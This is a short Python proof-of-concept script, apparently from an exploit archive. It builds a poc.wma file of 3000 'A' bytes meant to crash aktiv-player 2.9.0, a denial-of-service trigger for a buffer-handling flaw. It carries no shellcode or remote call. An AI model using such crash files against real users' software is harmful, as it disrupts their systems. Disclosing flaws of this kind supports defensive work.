# !/usr/bin/python
# Exploit Title: aktiv-player version 2.9.0 Crash PoC
# Exploit Author: metacom
# RST
# Vendor Homepage: http://www.goforsharing.com/home-mainmenu-1/aktiv-player-mainmenu-131.html
# Tested on: Windows 7 German
 
filename = "poc.wma"
 
buffer = "\x41" * 3000
exploit = buffer
  
textfile = open(filename , 'w')
textfile.write(exploit)
textfile.close()
